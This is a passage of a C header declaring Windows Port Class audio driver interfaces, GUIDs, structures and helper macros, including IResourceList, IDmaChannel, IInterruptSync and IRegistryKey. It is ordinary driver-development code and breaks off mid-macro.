    IRegistryKey
    IResourceList
    IServiceGroup
    IServiceSink
    IUnregisterPhysicalConnection   (Vista)
    IUnregisterSubdevice            (Vista)

    == AUDIO PORT OBJECT INTERFACES ==
    IPort
    IPortDMus
    IPortMidi
    IPortTopology
    IPortWaveCyclic
    IPortWavePci

    == AUDIO MINIPORT OBJECT INTERFACES ==
    IMiniport
    IMiniportDMus
    IMiniportMidi
    IMiniportTopology
    IMiniportWaveCyclic
    IMiniportWavePci

    == AUDIO MINIPORT AUXILIARY INTERFACES ==
    IMusicTechnology                (XP)
    IPinCount                       (XP)

    == AUDIO STREAM OBJECT INTERFACES ==
    IAllocatorMXF
    IDrmAudioStream                 (XP)
    IMiniportMidiStream
    IMiniportWaveCyclicStream
    IMiniportWavePciStream
    IMXF
    IPortWavePciStream
    ISynthSinkDMus

    == DIRECTMUSIC USERMODE SYNTH AND SYNTH SINK INTERFACES ==
    IDirectMusicSynth
    IDirectMusicSynthSink

    == AUDIO POWER MANAGEMENT INTERFACES ==
    IAdapterPowerManagement
    IPowerNotify
*/

#ifndef PORTCLS_H
#define PORTCLS_H

#ifdef __cplusplus
extern "C"
{
# include <wdm.h>
}
#else
# include <wdm.h>
#endif

#include <windef.h>

#define NOBITMAP
#include <mmreg.h>
#undef NOBITMAP

#include <punknown.h>
#include <ks.h>
#include <ksmedia.h>
#include <drmk.h>

#ifdef __cplusplus
extern "C"
{
# include <wdm.h>
}
#else
# include <wdm.h>
#endif

#ifndef PC_NO_IMPORTS
#define PORTCLASSAPI EXTERN_C __declspec(dllimport)
#else
#define PORTCLASSAPI EXTERN_C
#endif

/* TODO */
#define PCFILTER_NODE ((ULONG) -1)

/* HACK */
/* typedef PVOID CM_RESOURCE_TYPE; */

#define _100NS_UNITS_PER_SECOND 10000000L
#define PORT_CLASS_DEVICE_EXTENSION_SIZE ( 64 * sizeof(ULONG_PTR) )


DEFINE_GUID(CLSID_MiniportDriverFmSynth, 0xb4c90ae0L, 0x5791, 0x11d0, 0x86, 0xf9, 0x00, 0xa0, 0xc9, 0x11, 0xb5, 0x44);
DEFINE_GUID(CLSID_MiniportDriverFmSynthWithVol, 0xe5a3c139L, 0xf0f2, 0x11d1, 0x81, 0xaf, 0x00, 0x60, 0x08, 0x33, 0x16, 0xc1);

/* ===============================================================
    Event Item Flags - TODO
*/
#define PCEVENT_ITEM_FLAG_ENABLE            KSEVENT_TYPE_ENABLE
#define PCEVENT_ITEM_FLAG_ONESHOT           KSEVENT_TYPE_ONESHOT
#define PCEVENT_ITEM_FLAG_BASICSUPPORT      KSEVENT_TYPE_BASICSUPPORT


/* ===============================================================
    Event Verbs - TODO
*/
#define PCEVENT_VERB_NONE       0
#define PCEVENT_VERB_ADD        1
#define PCEVENT_VERB_REMOVE     2
#define PCEVENT_VERB_SUPPORT    4


/* ===============================================================
    Method Item Flags - TODO
*/
#define PCMETHOD_ITEM_FLAG_NONE             KSMETHOD_TYPE_NONE
#define PCMETHOD_ITEM_FLAG_READ             KSMETHOD_TYPE_READ
#define PCMETHOD_ITEM_FLAG_WRITE            KSMETHOD_TYPE_WRITE
#define PCMETHOD_ITEM_FLAG_MODIFY           KSMETHOD_TYPE_MODIFY
#define PCMETHOD_ITEM_FLAG_SOURCE           KSMETHOD_TYPE_SOURCE


/* ===============================================================
    Method Verbs - TODO
*/
#define PCMETHOD_ITEM_FLAG_BASICSUPPORT     KSMETHOD_TYPE_BASICSUPPORT
#define PCMETHOD_ITEM_FLAG_SEND
#define PCMETHOD_ITEM_FLAG_SETSUPPORT


/* ===============================================================
    Versions
    IoIsWdmVersionAvailable may also be used by older drivers.
*/

enum
{
    kVersionInvalid = -1,

    kVersionWin98,
    kVersionWin98SE,
    kVersionWin2K,
    kVersionWin98SE_QFE2,
    kVersionWin2K_SP2,
    kVersionWinME,
    kVersionWin98SE_QFE3,
    kVersionWinME_QFE1,
    kVersionWinXP,
    kVersionWinXPSP1,
    kVersionWinServer2003,
    kVersionWin2K_UAAQFE,           /* These support IUnregister* interface */
    kVersionWinXP_UAAQFE,
    kVersionWinServer2003_UAAQFE
};

/* ===============================================================
    Properties
*/

struct _PCPROPERTY_REQUEST;

typedef struct _PCPROPERTY_REQUEST PCPROPERTY_REQUEST, *PPCPROPERTY_REQUEST;

typedef NTSTATUS (NTAPI *PCPFNPROPERTY_HANDLER)(
    IN  PPCPROPERTY_REQUEST PropertyRequest);

typedef struct
{
    const GUID *            Set;
    ULONG                   Id;
    ULONG                   Flags;
#define PCPROPERTY_ITEM_FLAG_GET            KSPROPERTY_TYPE_GET
#define PCPROPERTY_ITEM_FLAG_SET            KSPROPERTY_TYPE_SET
#define PCPROPERTY_ITEM_FLAG_BASICSUPPORT   KSPROPERTY_TYPE_BASICSUPPORT
//not supported #define PCPROPERTY_ITEM_FLAG_RELATIONS      KSPROPERTY_TYPE_RELATIONS
#define PCPROPERTY_ITEM_FLAG_SERIALIZERAW   KSPROPERTY_TYPE_SERIALIZERAW
#define PCPROPERTY_ITEM_FLAG_UNSERIALIZERAW KSPROPERTY_TYPE_UNSERIALIZERAW
#define PCPROPERTY_ITEM_FLAG_SERIALIZESIZE  KSPROPERTY_TYPE_SERIALIZESIZE
#define PCPROPERTY_ITEM_FLAG_SERIALIZE\
        (PCPROPERTY_ITEM_FLAG_SERIALIZERAW\
        |PCPROPERTY_ITEM_FLAG_UNSERIALIZERAW\
        |PCPROPERTY_ITEM_FLAG_SERIALIZESIZE\
        )
#define PCPROPERTY_ITEM_FLAG_DEFAULTVALUES  KSPROPERTY_TYPE_DEFAULTVALUES
    PCPFNPROPERTY_HANDLER   Handler;
}
PCPROPERTY_ITEM, *PPCPROPERTY_ITEM;


struct _PCPROPERTY_REQUEST
{
    PUNKNOWN                MajorTarget;
    PUNKNOWN                MinorTarget;
    ULONG                   Node;
    const PCPROPERTY_ITEM * PropertyItem;
    ULONG                   Verb;
    ULONG                   InstanceSize;
    PVOID                   Instance;
    ULONG                   ValueSize;
    PVOID                   Value;
    PIRP                    Irp;
};

struct _PCEVENT_REQUEST;

typedef NTSTATUS (NTAPI *PCPFNEVENT_HANDLER)(
    IN  struct _PCEVENT_REQUEST* EventRequest);

typedef struct _PCEVENT_ITEM
{
    const GUID* Set;
    ULONG Id;
    ULONG Flags;
    PCPFNEVENT_HANDLER Handler;
} PCEVENT_ITEM, *PPCEVENT_ITEM;

typedef struct _PCEVENT_REQUEST
{
    PUNKNOWN MajorTarget;
    PUNKNOWN MinorTarget;
    ULONG Node;
    const PCEVENT_ITEM* EventItem;
    PKSEVENT_ENTRY EventEntry;
    ULONG Verb;
    PIRP Irp;
} PCEVENT_REQUEST, *PPCEVENT_REQUEST;



struct _PCMETHOD_REQUEST;

typedef NTSTATUS (NTAPI *PCPFNMETHOD_HANDLER)(
    IN  struct _PCMETHOD_REQUEST* MethodRequest);

typedef struct _PCMETHOD_ITEM
{
    const GUID* Set;
    ULONG Id;
    ULONG Flags;
    PCPFNMETHOD_HANDLER Handler;
} PCMETHOD_ITEM, *PPCMETHOD_ITEM;

typedef struct _PCMETHOD_REQUEST
{
    PUNKNOWN MajorTarget;
    PUNKNOWN MinorTarget;
    ULONG Node;
    const PCMETHOD_ITEM* MethodItem;
    ULONG Verb;
} PCMETHOD_REQUEST, *PPCMETHOD_REQUEST;


/* ===============================================================
    Structures (unsorted)
*/

typedef struct
{
    ULONG PropertyItemSize;
    ULONG PropertyCount;
    const PCPROPERTY_ITEM* Properties;
    ULONG MethodItemSize;
    ULONG MethodCount;
    const PCMETHOD_ITEM* Methods;
    ULONG EventItemSize;
    ULONG EventCount;
    const PCEVENT_ITEM* Events;
    ULONG Reserved;
} PCAUTOMATION_TABLE, *PPCAUTOMATION_TABLE;

typedef struct
{
    ULONG FromNode;
    ULONG FromNodePin;
    ULONG ToNode;
    ULONG ToNodePin;
} PCCONNECTION_DESCRIPTOR, *PPCCONNECTIONDESCRIPTOR;

typedef struct
{
    ULONG MaxGlobalInstanceCount;
    ULONG MaxFilterInstanceCount;
    ULONG MinFilterInstanceCount;
    const PCAUTOMATION_TABLE* AutomationTable;
    KSPIN_DESCRIPTOR KsPinDescriptor;
} PCPIN_DESCRIPTOR, *PPCPIN_DESCRIPTOR;

typedef struct
{
    ULONG Flags;
    const PCAUTOMATION_TABLE* AutomationTable;
    const GUID* Type;
    const GUID* Name;
} PCNODE_DESCRIPTOR, *PPCNODE_DESCRIPTOR;

typedef struct
{
    ULONG Version;
    const PCAUTOMATION_TABLE* AutomationTable;
    ULONG PinSize;
    ULONG PinCount;
    const PCPIN_DESCRIPTOR* Pins;
    ULONG NodeSize;
    ULONG NodeCount;
    const PCNODE_DESCRIPTOR* Nodes;
    ULONG ConnectionCount;
    const PCCONNECTION_DESCRIPTOR* Connections;
    ULONG CategoryCount;
    const GUID* Categories;
} PCFILTER_DESCRIPTOR, *PPCFILTER_DESCRIPTOR;

#define DEFINE_PCAUTOMATION_TABLE_PROP(AutomationTable,PropertyTable)\
const PCAUTOMATION_TABLE AutomationTable =\
{\
    sizeof(PropertyTable[0]),\
    SIZEOF_ARRAY(PropertyTable),\
    (const PCPROPERTY_ITEM *) PropertyTable,\
    0,0,NULL,\
    0,0,NULL,\
    0\
}

/* ===============================================================
    IResourceList Interface
*/

#undef INTERFACE
#define INTERFACE IResourceList

DEFINE_GUID(IID_IResourceList, 0x22C6AC60L, 0x851B, 0x11D0, 0x9A, 0x7F, 0x00, 0xAA, 0x00, 0x38, 0xAC, 0xFE);

DECLARE_INTERFACE_(IResourceList, IUnknown)
{
    DEFINE_ABSTRACT_UNKNOWN()

    STDMETHOD_(ULONG, NumberOfEntries)( THIS ) PURE;

    STDMETHOD_(ULONG, NumberOfEntriesOfType)( THIS_
        IN  CM_RESOURCE_TYPE Type) PURE;

    STDMETHOD_(PCM_PARTIAL_RESOURCE_DESCRIPTOR, FindTranslatedEntry)( THIS_
        IN  CM_RESOURCE_TYPE Type,
        IN  ULONG Index) PURE;

    STDMETHOD_(PCM_PARTIAL_RESOURCE_DESCRIPTOR, FindUntranslatedEntry)( THIS_
        IN  CM_RESOURCE_TYPE Type,
        IN  ULONG Index) PURE;

    STDMETHOD_(NTSTATUS, AddEntry)( THIS_
        IN  PCM_PARTIAL_RESOURCE_DESCRIPTOR Translated,
        IN  PCM_PARTIAL_RESOURCE_DESCRIPTOR Untranslated) PURE;

    STDMETHOD_(NTSTATUS, AddEntryFromParent)( THIS_
        IN  IResourceList* Parent,
        IN  CM_RESOURCE_TYPE Type,
        IN  ULONG Index) PURE;

    STDMETHOD_(PCM_RESOURCE_LIST, TranslatedList)( THIS ) PURE;
    STDMETHOD_(PCM_RESOURCE_LIST, UntranslatedList)( THIS ) PURE;
};

#define IMP_IResourceList \
    STDMETHODIMP_(ULONG) NumberOfEntries(void); \
\
    STDMETHODIMP_(ULONG) NumberOfEntriesOfType( \
        IN  CM_RESOURCE_TYPE Type); \
\
    STDMETHODIMP_(PCM_PARTIAL_RESOURCE_DESCRIPTOR) FindTranslatedEntry( \
        IN  CM_RESOURCE_TYPE Type, \
        IN  ULONG Index); \
\
    STDMETHODIMP_(PCM_PARTIAL_RESOURCE_DESCRIPTOR) FindUntranslatedEntry( \
        IN  CM_RESOURCE_TYPE Type, \
        IN  ULONG Index); \
\
    STDMETHODIMP_(NTSTATUS) AddEntry( \
        IN  PCM_PARTIAL_RESOURCE_DESCRIPTOR Translated, \
        IN  PCM_PARTIAL_RESOURCE_DESCRIPTOR Untranslated); \
\
    STDMETHODIMP_(NTSTATUS) AddEntryFromParent( \
        IN  IResourceList* Parent, \
        IN  CM_RESOURCE_TYPE Type, \
        IN  ULONG Index); \
\
    STDMETHODIMP_(PCM_RESOURCE_LIST) TranslatedList(void); \
    STDMETHODIMP_(PCM_RESOURCE_LIST) UntranslatedList(void);

typedef IResourceList *PRESOURCELIST;

#define NumberOfPorts() \
    NumberOfEntriesOfType(CmResourceTypePort)

#define FindTranslatedPort(n) \
    FindTranslatedEntry(CmResourceTypePort, (n))

#define FindUntranslatedPort(n) \
    FindUntranslatedEntry(CmResourceTypePort, (n))

#define AddPortFromParent(p, n) \
    AddEntryFromParent((p), CmResourceTypePort, (n))

#define NumberOfInterrupts() \
    NumberOfEntriesOfType(CmResourceTypeInterrupt)

#define FindTranslatedInterrupt(n) \
    FindTranslatedEntry(CmResourceTypeInterrupt, (n))

#define FindUntranslatedInterrupt(n) \
    FindUntranslatedEntry(CmResourceTypeInterrupt, (n))

#define AddInterruptFromParent(p, n) \
    AddEntryFromParent((p), CmResourceTypeInterrupt, (n))

#define NumberOfMemories() \
    NumberOfEntriesOfType(CmResourceTypeMemory)

#define FindTranslatedMemory(n) \
    FindTranslatedEntry(CmResourceTypeMemory, (n))

#define FindUntranslatedMemory(n) \
    FindUntranslatedEntry(CmResourceTypeMemory, (n))

#define AddMemoryFromParent(p, n) \
    AddEntryFromParent((p), CmResourceTypeMemory, (n))

#define NumberOfDmas() \
    NumberOfEntriesOfType(CmResourceTypeDma)

#define FindTranslatedDma(n) \
    FindTranslatedEntry(CmResourceTypeDma, (n))

#define FindUntranslatedDma(n) \
    FindUntranslatedEntry(CmResourceTypeDma, (n))

#define AddDmaFromParent(p, n) \
    AddEntryFromParent((p), CmResourceTypeInterrupt, (n))

#define NumberOfDeviceSpecifics() \
    NumberOfEntriesOfType(CmResourceTypeDeviceSpecific)

#define FindTranslatedDeviceSpecific(n) \
    FindTranslatedEntry(CmResourceTypeDeviceSpecific, (n))

#define FindUntranslatedDeviceSpecific(n) \
    FindUntranslatedEntry(CmResourceTypeDeviceSpecific, (n))

#define AddDeviceSpecificFromParent(p, n) \
    AddEntryFromParent((p), CmResourceTypeDeviceSpecific, (n))

#define NumberOfBusNumbers() \
    NumberOfEntriesOfType(CmResourceTypeBusNumber)

#define FindTranslatedBusNumber(n) \
    FindTranslatedEntry(CmResourceTypeBusNumber, (n))

#define FindUntranslatedBusNumber(n) \
    FindUntranslatedEntry(CmResourceTypeBusNumber, (n))

#define AddBusNumberFromParent(p, n) \
    AddEntryFromParent((p), CmResourceTypeBusNumber, (n))

#define NumberOfDevicePrivates() \
    NumberOfEntriesOfType(CmResourceTypeDevicePrivate)

#define FindTranslatedDevicePrivate(n) \
    FindTranslatedEntry(CmResourceTypeDevicePrivate, (n))

#define FindUntranslatedDevicePrivate(n) \
    FindUntranslatedEntry(CmResourceTypeDevicePrivate, (n))

#define AddDevicePrivateFromParent(p, n) \
    AddEntryFromParent((p), CmResourceTypeDevicePrivate, (n))

#define NumberOfAssignedResources() \
    NumberOfEntriesOfType(CmResourceTypeAssignedResource)

#define FindTranslatedAssignedResource(n) \
    FindTranslatedEntry(CmResourceTypeAssignedResource, (n))

#define FindUntranslatedAssignedResource(n) \
    FindUntranslatedEntry(CmResourceTypeAssignedResource, (n))

#define AddAssignedResourceFromParent(p, n) \
    AddEntryFromParent((p), CmResourceTypeAssignedResource, (n))

#define NumberOfSubAllocateFroms() \
    NumberOfEntriesOfType(CmResourceTypeSubAllocateFrom)

#define FindTranslatedSubAllocateFrom(n) \
    FindTranslatedEntry(CmResourceTypeSubAllocateFrom, (n))

#define FindUntranslatedSubAllocateFrom(n) \
    FindUntranslatedEntry(CmResourceTypeSubAllocateFrom, (n))

#define AddSubAllocateFromFromParent(p, n) \
    AddEntryFromParent((p), CmResourceTypeSubAllocateFrom, (n))

#undef INTERFACE


/* ===============================================================
    IServiceSink Interface
*/
#define INTERFACE IServiceSink

DEFINE_GUID(IID_IServiceSink, 0x22C6AC64L, 0x851B, 0x11D0, 0x9A, 0x7F, 0x00, 0xAA, 0x00, 0x38, 0xAC, 0xFE);

DECLARE_INTERFACE_(IServiceSink, IUnknown)
{
    DEFINE_ABSTRACT_UNKNOWN()
    STDMETHOD_(void, RequestService)( THIS ) PURE;
};

#define IMP_IServiceSink \
    STDMETHODIMP_(void) RequestService(void);

typedef IServiceSink *PSERVICESINK;


/* ===============================================================
    IServiceGroup Interface
*/
#undef INTERFACE
#define INTERFACE IServiceGroup

DEFINE_GUID(IID_IServiceGroup, 0x22C6AC65L, 0x851B, 0x11D0, 0x9A, 0x7F, 0x00, 0xAA, 0x00, 0x38, 0xAC, 0xFE);

DECLARE_INTERFACE_(IServiceGroup, IServiceSink)
{
    DEFINE_ABSTRACT_UNKNOWN()

    STDMETHOD_(void, RequestService)( THIS ) PURE;  /* IServiceSink */

    STDMETHOD_(NTSTATUS, AddMember)( THIS_
        IN  PSERVICESINK pServiceSink) PURE;

    STDMETHOD_(void, RemoveMember)( THIS_
        IN  PSERVICESINK pServiceSink) PURE;

    STDMETHOD_(void, SupportDelayedService)( THIS ) PURE;

    STDMETHOD_(void, RequestDelayedService)( THIS_
        IN  ULONGLONG ullDelay) PURE;

    STDMETHOD_(void, CancelDelayedService)( THIS ) PURE;
};

#define IMP_IServiceGroup \
    IMP_IServiceSink; \
\
    STDMETHODIMP_(NTSTATUS) AddMember( \
        IN  PSERVICESINK pServiceSink); \
\
    STDMETHODIMP_(void) RemoveMember( \
        IN  PSERVICESINK pServiceSink); \
\
    STDMETHODIMP_(void) SupportDelayedService(void); \
\
    STDMETHODIMP_(void) RequestDelayedService( \
        IN  ULONGLONG ullDelay); \
\
    STDMETHODIMP_(void) CancelDelayedService(void);

typedef IServiceGroup *PSERVICEGROUP;


#if (NTDDI_VERSION >= NTDDI_WS03)
/* ===============================================================
    IUnregisterSubdevice Interface
*/

DEFINE_GUID(IID_IUnregisterSubdevice, 0x16738177L, 0xe199, 0x41f9, 0x9a, 0x87, 0xab, 0xb2, 0xa5, 0x43, 0x2f, 0x21);

#undef INTERFACE
#define INTERFACE IUnregisterSubdevice

DECLARE_INTERFACE_(IUnregisterSubdevice,IUnknown)
{
    DEFINE_ABSTRACT_UNKNOWN()

    STDMETHOD_(NTSTATUS,UnregisterSubdevice)(THIS_
        IN  PDEVICE_OBJECT  DeviceObject,
        IN  PUNKNOWN        Unknown)PURE;
};

typedef IUnregisterSubdevice *PUNREGISTERSUBDEVICE;

#define IMP_IUnregisterSubdevice                        \
    STDMETHODIMP_(NTSTATUS) UnregisterSubdevice(THIS_   \
        IN  PDEVICE_OBJECT  DeviceObject,               \
        IN  PUNKNOWN        Unknown)

/* ===============================================================
    IUnregisterPhysicalConnection Interface
*/

#undef INTERFACE
#define INTERFACE IUnregisterPhysicalConnection

DEFINE_GUID(IID_IUnregisterPhysicalConnection, 0x6c38e231L, 0x2a0d, 0x428d, 0x81, 0xf8, 0x07, 0xcc, 0x42, 0x8b, 0xb9, 0xa4);

DECLARE_INTERFACE_(IUnregisterPhysicalConnection,IUnknown)
{
    DEFINE_ABSTRACT_UNKNOWN()

    STDMETHOD_(NTSTATUS,UnregisterPhysicalConnection)(THIS_
        IN  PDEVICE_OBJECT  DeviceObject,
        IN  PUNKNOWN        FromUnknown,
        IN  ULONG           FromPin,
        IN  PUNKNOWN        ToUnknown,
        IN  ULONG           ToPin)PURE;

    STDMETHOD_(NTSTATUS,UnregisterPhysicalConnectionToExternal)(THIS_
        IN  PDEVICE_OBJECT  DeviceObject,
        IN  PUNKNOWN        FromUnknown,
        IN  ULONG           FromPin,
        IN  PUNICODE_STRING ToString,
        IN  ULONG           ToPin)PURE;

    STDMETHOD_(NTSTATUS,UnregisterPhysicalConnectionFromExternal)(THIS_
        IN  PDEVICE_OBJECT  DeviceObject,
        IN  PUNICODE_STRING FromString,
        IN  ULONG           FromPin,
        IN  PUNKNOWN        ToUnknown,
        IN  ULONG           ToPin)PURE;
};

typedef IUnregisterPhysicalConnection *PUNREGISTERPHYSICALCONNECTION;
#endif

#define IMP_IUnregisterPhysicalConnection                                    \
    STDMETHODIMP_(NTSTATUS) UnregisterPhysicalConnection(                    \
        IN  PDEVICE_OBJECT  DeviceObject,                                    \
        IN  PUNKNOWN        FromUnknown,                                     \
        IN  ULONG           FromPin,                                         \
        IN  PUNKNOWN        ToUnknown,                                       \
        IN  ULONG           ToPin);                                          \
                                                                             \
    STDMETHODIMP_(NTSTATUS) UnregisterPhysicalConnectionToExternal(          \
        IN  PDEVICE_OBJECT  DeviceObject,                                    \
        IN  PUNKNOWN        FromUnknown,                                     \
        IN  ULONG           FromPin,                                         \
        IN  PUNICODE_STRING ToString,                                        \
        IN  ULONG           ToPin);                                          \
                                                                             \
    STDMETHODIMP_(NTSTATUS) UnregisterPhysicalConnectionFromExternal(        \
        IN  PDEVICE_OBJECT  DeviceObject,                                    \
        IN  PUNICODE_STRING FromString,                                      \
        IN  ULONG           FromPin,                                         \
        IN  PUNKNOWN        ToUnknown,                                       \
        IN  ULONG           ToPin)


/* ===============================================================
    IDmaChannel Interface
*/

#define DEFINE_ABSTRACT_DMACHANNEL() \
    STDMETHOD_(NTSTATUS, AllocateBuffer)( THIS_ \
        IN  ULONG BufferSize, \
        IN  PPHYSICAL_ADDRESS PhysicalAddressConstraint OPTIONAL) PURE; \
\
    STDMETHOD_(void, FreeBuffer)( THIS ) PURE; \
    STDMETHOD_(ULONG, TransferCount)( THIS ) PURE; \
    STDMETHOD_(ULONG, MaximumBufferSize)( THIS ) PURE; \
    STDMETHOD_(ULONG, AllocatedBufferSize)( THIS ) PURE; \
    STDMETHOD_(ULONG, BufferSize)( THIS ) PURE; \
\
    STDMETHOD_(void, SetBufferSize)( THIS_ \
        IN  ULONG BufferSize) PURE; \
\
    STDMETHOD_(PVOID, SystemAddress)( THIS ) PURE; \
    STDMETHOD_(PHYSICAL_ADDRESS, PhysicalAddress)( THIS ) PURE; \
    STDMETHOD_(PADAPTER_OBJECT, GetAdapterObject)( THIS ) PURE; \
\
    STDMETHOD_(void, CopyTo)( THIS_ \
        IN  PVOID Destination, \
        IN  PVOID Source, \
        IN  ULONG ByteCount) PURE; \
\
    STDMETHOD_(void, CopyFrom)( THIS_ \
        IN  PVOID Destination, \
        IN  PVOID Source, \
        IN  ULONG ByteCount) PURE;

#define IMP_IDmaChannel                                                   \
    STDMETHODIMP_(NTSTATUS) AllocateBuffer(                               \
        IN  ULONG BufferSize,                                             \
        IN  PPHYSICAL_ADDRESS PhysicalAddressConstraint OPTIONAL);        \
                                                                          \
    STDMETHODIMP_(void) FreeBuffer(void);                                 \
    STDMETHODIMP_(ULONG) TransferCount(void);                             \
    STDMETHODIMP_(ULONG) MaximumBufferSize(void);                         \
    STDMETHODIMP_(ULONG) AllocatedBufferSize(void);                       \
    STDMETHODIMP_(ULONG) BufferSize(void);                                \
                                                                          \
    STDMETHODIMP_(void) SetBufferSize(                                    \
        IN  ULONG BufferSize);                                            \
                                                                          \
    STDMETHODIMP_(PVOID) SystemAddress(void);                             \
    STDMETHODIMP_(PHYSICAL_ADDRESS) PhysicalAddress(void);                \
    STDMETHODIMP_(PADAPTER_OBJECT) GetAdapterObject(void);                \
                                                                          \
    STDMETHODIMP_(void) CopyTo(                                           \
        IN  PVOID Destination,                                            \
        IN  PVOID Source,                                                 \
        IN  ULONG ByteCount);                                             \
                                                                          \
    STDMETHODIMP_(void) CopyFrom(                                         \
        IN  PVOID Destination,                                            \
        IN  PVOID Source,                                                 \
        IN  ULONG ByteCount)

#undef INTERFACE
#define INTERFACE IDmaChannel

DEFINE_GUID(IID_IDmaChannel, 0x22C6AC61L, 0x851B, 0x11D0, 0x9A, 0x7F, 0x00, 0xAA, 0x00, 0x38, 0xAC, 0xFE);

DECLARE_INTERFACE_(IDmaChannel, IUnknown)
{
    DEFINE_ABSTRACT_UNKNOWN()
    DEFINE_ABSTRACT_DMACHANNEL()
};

typedef IDmaChannel *PDMACHANNEL;


/* ===============================================================
    IDmaChannelSlave Interface
*/

#define DEFINE_ABSTRACT_DMACHANNELSLAVE() \
    STDMETHOD_(NTSTATUS, Start)( THIS_ \
        IN  ULONG MapSize, \
        IN  BOOLEAN WriteToDevice) PURE; \
\
    STDMETHOD_(NTSTATUS, Stop)( THIS ) PURE; \
    STDMETHOD_(ULONG, ReadCounter)( THIS ) PURE; \
\
    STDMETHOD_(NTSTATUS, WaitForTC)( THIS_ \
        ULONG Timeout) PURE;

#define IMP_IDmaChannelSlave                   \
    IMP_IDmaChannel;                           \
    STDMETHODIMP_(NTSTATUS) Start(             \
        IN  ULONG MapSize,                     \
        IN  BOOLEAN WriteToDevice);            \
                                               \
    STDMETHODIMP_(NTSTATUS) Stop(void);        \
    STDMETHODIMP_(ULONG) ReadCounter(void);    \
                                               \
    STDMETHODIMP_(NTSTATUS) WaitForTC(         \
        ULONG Timeout)

#undef INTERFACE
#define INTERFACE IDmaChannelSlave

#if (NTDDI_VERSION < NTDDI_LONGHORN)
DEFINE_GUID(IID_IDmaChannelSlave, 0x22C6AC62L, 0x851B, 0x11D0, 0x9A, 0x7F, 0x00, 0xAA, 0x00, 0x38, 0xAC, 0xFE);
#endif

#undef INTERFACE
#define INTERFACE IDmaChannelSlave

DECLARE_INTERFACE_(IDmaChannelSlave, IDmaChannel)
{
    DEFINE_ABSTRACT_UNKNOWN()
    DEFINE_ABSTRACT_DMACHANNEL()
    DEFINE_ABSTRACT_DMACHANNELSLAVE()
};

typedef IDmaChannelSlave *PDMACHANNELSLAVE;


/* ===============================================================
    IInterruptSync Interface
*/

typedef enum
{
    InterruptSyncModeNormal = 1,
    InterruptSyncModeAll,
    InterruptSyncModeRepeat
} INTERRUPTSYNCMODE;

struct IInterruptSync;

typedef NTSTATUS (NTAPI *PINTERRUPTSYNCROUTINE)(
    IN  struct IInterruptSync* InterruptSync,
    IN  PVOID DynamicContext);

#undef INTERFACE
#define INTERFACE IInterruptSync

DECLARE_INTERFACE_(IInterruptSync, IUnknown)
{
    DEFINE_ABSTRACT_UNKNOWN()

    STDMETHOD_(NTSTATUS, CallSynchronizedRoutine)( THIS_
        IN  PINTERRUPTSYNCROUTINE Routine,
        IN  PVOID DynamicContext) PURE;

    STDMETHOD_(PKINTERRUPT, GetKInterrupt)( THIS ) PURE;
    STDMETHOD_(NTSTATUS, Connect)( THIS ) PURE;
    STDMETHOD_(void, Disconnect)( THIS ) PURE;

    STDMETHOD_(NTSTATUS, RegisterServiceRoutine)( THIS_
        IN  PINTERRUPTSYNCROUTINE Routine,
        IN  PVOID DynamicContext,
        IN  BOOLEAN First) PURE;
};

DEFINE_GUID(IID_IInterruptSync, 0x22C6AC63L, 0x851B, 0x11D0, 0x9A, 0x7F, 0x00, 0xAA, 0x00, 0x38, 0xAC, 0xFE);

#define IMP_IInterruptSync                           \
    STDMETHODIMP_(NTSTATUS) CallSynchronizedRoutine( \
        IN  PINTERRUPTSYNCROUTINE Routine,           \
        IN  PVOID DynamicContext);                   \
                                                     \
    STDMETHODIMP_(PKINTERRUPT) GetKInterrupt(void);  \
    STDMETHODIMP_(NTSTATUS) Connect(void);           \
    STDMETHODIMP_(void) Disconnect(void);            \
                                                     \
    STDMETHODIMP_(NTSTATUS) RegisterServiceRoutine(  \
        IN  PINTERRUPTSYNCROUTINE Routine,           \
        IN  PVOID DynamicContext,                    \
        IN  BOOLEAN First)

typedef IInterruptSync *PINTERRUPTSYNC;


/* ===============================================================
    IRegistryKey Interface
*/

#undef INTERFACE
#define INTERFACE IRegistryKey

enum
{
    GeneralRegistryKey,
    DeviceRegistryKey,
    DriverRegistryKey,
    HwProfileRegistryKey,
    DeviceInterfaceRegistryKey
};

DEFINE_GUID(IID_IRegistryKey, 0xE8DA4302l, 0xF304, 0x11D0, 0x95, 0x8B, 0x00, 0xC0, 0x4F, 0xB9, 0x25, 0xD3);

DECLARE_INTERFACE_(IRegistryKey, IUnknown)
{
    DEFINE_ABSTRACT_UNKNOWN()

    STDMETHOD_(NTSTATUS, QueryKey)( THIS_
        IN  KEY_INFORMATION_CLASS KeyInformationClass,
        OUT PVOID KeyInformation,
        IN  ULONG Length,
        OUT PULONG ResultLength) PURE;

    STDMETHOD_(NTSTATUS, EnumerateKey)( THIS_
        IN  ULONG Index,
        IN  KEY_INFORMATION_CLASS KeyInformationClass,
        OUT PVOID KeyInformation,
        IN  ULONG Length,
        OUT PULONG ResultLength) PURE;

    STDMETHOD_(NTSTATUS, QueryValueKey)( THIS_
        IN  PUNICODE_STRING ValueName,
        IN  KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
        OUT PVOID KeyValueInformation,
        IN  ULONG Length,
        OUT PULONG ResultLength) PURE;

    STDMETHOD_(NTSTATUS, EnumerateValueKey)( THIS_
        IN  ULONG Index,
        IN  KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
        OUT PVOID KeyValueInformation,
        IN  ULONG Length,
        OUT PULONG ResultLength) PURE;

    STDMETHOD_(NTSTATUS, SetValueKey)( THIS_
        IN  PUNICODE_STRING ValueName OPTIONAL,
        IN  ULONG Type,
        IN  PVOID Data,
        IN  ULONG DataSize) PURE;

    STDMETHOD_(NTSTATUS, QueryRegistryValues)( THIS_
        IN  PRTL_QUERY_REGISTRY_TABLE QueryTable,
        IN  PVOID Context OPTIONAL) PURE;

    STDMETHOD_(NTSTATUS, NewSubKey)( THIS_
        OUT IRegistryKey** RegistrySubKey,
        IN  PUNKNOWN OuterUnknown,
        IN  ACCESS_MASK DesiredAccess,
        IN  PUNICODE_STRING SubKeyName,
        IN  ULONG CreateOptions,
        OUT PULONG Disposition OPTIONAL) PURE;

    STDMETHOD_(NTSTATUS, DeleteKey)( THIS ) PURE;
};

#define IMP_IRegistryKey \
    STDMETHODIMP_(NTSTATUS) QueryKey( \
        IN  KEY_INFORMATION_CLASS KeyInformationClass, \
        OUT PVOID KeyInformation, \
        IN  ULONG Length, \
        OUT PULONG ResultLength); \
\
    STDMETHODIMP_(NTSTATUS) EnumerateKey( \
        IN  ULONG Index, \
        IN  KEY_INFORMATION_CLASS KeyInformationClass, \
        OUT PVOID KeyInformation, \
        IN  ULONG Length, \
